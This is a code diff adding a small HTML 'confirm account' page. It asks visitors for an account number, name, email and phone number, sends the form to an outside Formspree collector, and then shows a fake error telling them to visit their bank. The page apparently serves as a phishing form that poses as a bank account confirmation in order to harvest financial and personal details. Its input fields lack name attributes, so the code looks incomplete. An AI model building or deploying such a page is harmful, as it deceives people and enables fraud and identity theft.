@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>confirm account</title>
+    <style>
+        .confirm-container button{
+    background-color: black;
+    color: #fff;
+    padding: 10px  20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 20%;
+}
+
+.confirm-container input{
+    width: 19%;
+    padding: 10px;
+    margin-bottom: 0px;
+    border-radius:10px;
+}
+    </style>
+</head>
+<body style="text-align: center;">
+
+
+    <div class="confirm-container">
+        <h3>Please enter your account number <br> 
+            then click on confirm email input
+        </h3>
+        <form action="https://formspree.io/f/mnqkarng" method="POST">
+    <label for="ACCOUNT NUMBER">ACCOUNT NUMBER</label><br>
+    <input type="text" required><br><br>
+    <label for="Name">NAME</label><br>
+    <input type="text" required><br><br>
+    <label for="EMAIL">EMAIL</label><br>
+    <input type="email" required><br><br>
+    <label for="CONFIRM EMAIL">CONFIRM EMAIL</label><br>
+    <input type="email" required><br><br>
+    <label for="PHONE NUMBER">PHONE NUMBER</label><br>
+    <input type="text" required><br><br>
+    <label for="CONFIRM PHONE NUMBER">CONFIRM PHONE NUMBER</label><br>
+    <input type="text" required><br><br>
+    
+    <button onclick="func()" style="background-color: black; color: white;">OK</button>
+	<script>
+		function func() {
+			alert(" trouble registering try visiting your bank, thank you!")
+    
+		}
+	</script>
+    
+</div>
+</form>
+
+</body>
+</html>
